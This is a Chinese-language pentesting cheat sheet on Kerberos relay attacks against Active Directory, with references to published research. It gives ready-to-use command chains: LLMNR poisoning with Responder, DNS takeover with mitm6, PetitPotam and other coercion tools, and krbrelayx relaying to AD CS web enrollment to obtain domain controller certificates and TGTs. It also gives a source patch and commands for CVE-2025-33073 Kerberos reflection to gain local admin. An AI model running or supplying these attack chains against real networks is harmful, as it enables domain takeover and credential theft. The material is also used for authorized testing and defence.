# 内网 - Kerberos 中继

## 通过 HTTP 进行 Kerberos 中继

**前提条件**：

* 无签名的服务的 Kerberos 认证

通过多播投毒（LLMNR）的 HTTP

* 攻击者在多播范围内设置 LLMNR 投毒器。
* 多播范围内的 HTTP 客户端无法解析主机名。这可能是由于浏览器中的拼写错误、配置错误，也可以由攻击者通过 WebDav 强制认证触发。
* LLMNR 投毒器指示该主机名解析为攻击者的机器。在 LLMNR 响应中，应答名称与查询不同，对应于任意中继目标。
* 受害者在攻击者 Web 服务器上执行请求，该服务器要求 Kerberos 认证。
* 受害者使用中继目标的 SPN 请求 ST。然后将生成的 AP-REQ 发送到攻击者 Web 服务器。
* 攻击者提取 AP-REQ 并将其中继到中继目标的服务。

**示例**：ESC8 结合 Kerberos 中继

```ps1
python3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>
sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
```

## 通过 DNS 进行 Kerberos 中继

滥用 Active Directory 中的 DNS 安全动态更新。

* [dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
* [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

**步骤**：

* 客户端查询其名称的起始授权（SOA）记录，该记录指示哪台服务器对客户端所在域具有权威性。
* 服务器以权威 DNS 服务器响应，在此示例中为 DC icorp-dc.internal.corp。
* 客户端尝试在 internal.corp 区域中对其名称的 A 记录进行动态更新。
* 此动态更新被服务器拒绝，因为没有提供身份验证。
* 客户端使用 TKEY 查询协商用于认证查询的密钥。
* 服务器以 TKEY 资源记录应答，完成身份验证。
* 客户端再次发送动态更新，但这次附带 TSIG 记录，这是使用步骤 5 和 6 中建立的密钥的签名。
* 服务器确认动态更新。新的 DNS 记录现已就位。

```ps1
# 示例 - 中继到 ADCS - ESC8
sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
```

## 通过 SMB 进行 Kerberos 中继

滥用 SMB 客户端在请求 ST 时构造 SPN 的方式。

* [cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) - Kerberos 中继框架。
* [decoder-it/KrbRelayEx-RPC](https://github.com/decoder-it/KrbRelayEx-RPC) - 用于（伪造）RPC/DCOM MiTM 服务器的 Kerberos 中继和转发器。

```ps1
dnstool.py -u "DOMAIN.LOCAL\\user" -p "pass" -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
petitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc.domain.local
krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
```

## Kerberos 反射 - CVE-2025-33073

通过使用 `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 技巧将一台机器中继到其自身。同时授予本地管理员权限。

* 为 `[服务器名] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 添加指向我们 IP 地址的 DNS 记录。也可以通过注册 `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 来入侵任何易受攻击的机器。

    ```ps1
    dnstool.py -u 'domain.local\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 198.51.100.27
    # 或
    pretender -i "vmnet2" --spoof "target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" --no-dhcp --no-timestamps
    ```

* 编辑 `krbrelayx/lib/servers/smbrelayserver.py` 并删除以下行

    ```ps1
    156: blob['tokenOid'] = '1.3.6.1.5.5.2'
    157: blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
    158:                                                MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
    159:                                                MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
    ```

* 启动中继以捕获来自 TARGET 的回调。

    ```ps1
    krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
    krbrelayx.py --target smb://target.lab.redteam -c whoam
    ```

* 使用 PetitPotam 触发服务器到 `[服务器名] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 的回调。

    ```ps1
    nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
    # 或
    petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
    # 或
    wspcoerce 'lab.redteam/user:password@target.lab.redteam' file:////target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
    ```

## 参考资料

* [A Look in the Mirror - The Reflective Kerberos Relay Attack - RedTeam Pentesting - June 11, 2025](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
* [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - January 27, 2025](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
* [From NTLM relay to Kerberos relay: Everything you need to know - Decoder - April 24, 2025](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)
* [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - June 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
* [Relaying Kerberos over DNS using krbrelayx and mitm6 - Dirk-jan Mollema - February 22, 2022](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
* [Relaying Kerberos over SMB using krbrelayx - Hugo Vincent - November 20, 2024](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)
* [Using Kerberos for Authentication Relay Attacks - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
* [Windows Exploitation Tricks: Relaying DCOM Authentication - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
